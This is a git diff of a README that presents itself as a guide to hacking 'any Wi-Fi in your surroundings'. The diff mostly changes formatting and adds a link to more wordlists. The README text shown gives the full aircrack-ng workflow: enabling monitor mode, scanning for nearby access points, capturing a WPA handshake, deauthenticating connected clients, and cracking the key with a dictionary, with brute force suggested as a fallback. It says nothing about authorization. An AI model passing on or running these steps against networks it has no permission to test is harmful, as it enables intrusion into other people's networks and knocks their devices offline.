@@ -6,6 +6,7 @@ This repo contains every step to hack any Wi-Fi in your surroundings.
    - Using your machine doesn't require any external Wi-Fi adapter if the internal one supports monitor mode.  
 
 ## Install aircrack-ng:  
+
 Arch:
 ```
 sudo pacman -S aircrack-ng
@@ -26,7 +27,8 @@ sudo dnf install aircrack-ng
 ```
 
 
-## Check your wireless LAN adapter name:
+## Check your wireless LAN adapter name:  
+
 ```
 ip addr
 ```
@@ -50,7 +52,8 @@ Here it is wlan0.
 ```
 
 
-## Change your adapter from managed mode to monitor mode
+## Change your adapter from managed mode to monitor mode  
+
 **Check it's mode:**
 ```
 iwconfig
@@ -100,7 +103,8 @@ If you try to check, the wlan0 name is changed to wlan0mon, because we have chan
 
 
 
-## Discover the Access Points:
+## Discover the Access Points:  
+
 ```
 sudo airodump-ng wlan0mon
 ```
@@ -116,7 +120,8 @@ It will show the information of your targetted network and below it shows the co
 
 
 
-## Storing the captured HandShake file to the local:
+## Storing the captured HandShake file to the local:  
+
 ```
 sudo airodump-ng -w getpass -c <CHANNEL> --bssid <BSSID> wlan0mon
 ```
@@ -127,7 +132,8 @@ Don't stop the process (Follow the next steps instead) and leave it till we send
 
 
 
-## Send the De-Authentication request:
+## Send the De-Authentication request:  
+
 Open a new console window and input the command there. That means you are instructed not to kill the process of the previous tab. That should be opened because we will get that file on that other window only.  
 Enter the below command in the new tab of the console.
 ```
@@ -139,7 +145,8 @@ This sends the De-Authentication request to the targetted network which means, t
 
 
 
-## Checking the directory if the Handshake is captured:
+## Checking the directory if the Handshake is captured:  
+
 ```clear``` all the commands.
 List the current directory by ```ls```
 If any file named ```getpass-01.cap```is found that means the file is captured and it is ready to be cracked.
@@ -147,11 +154,14 @@ If nothing is found named ```getpass-01.cap``` that means the whole process shou
 
 
 
-## Cracking the HandShake file using aircrack-ng (Dictionary Attack):
-Cracking that file needs some wordlists. Few wordlists are available in this repo and anyone from this should be downloaded.  
+## Cracking the HandShake file using aircrack-ng (Dictionary Attack):  
+
+Cracking that file needs some wordlists. A word list is available in this repo and this should be downloaded.  
+For more wordlists, it is recommended to visit - [wpa2-wordlists](https://github.com/kennyn510/wpa2-wordlists)  
 List the directory by ```ls``` to make sure both the wordlist and the Handshake file are present there.  
 
 **Use the below command to crack the key:**  
+
 ```aircrack-ng getpass-01.cap -w <WORDLIST-PATH>```  
 Replace < WORDLIST-PATH > with the path of the wordlist downloaded.  
 
@@ -159,7 +169,8 @@ _Now the output is either 'THE KEY IS FOUND' or 'THE KEY IS NOT FOUND'. If the k
 It is also suggested to go with a BruteForce attack if the key can't be found in wordlists.
 
 
-## Switch to managed mode again from monitor mode:
+## Switch to managed mode again from monitor mode:  
+
 ```
 sudo airmon-ng stop wlan0
 ```
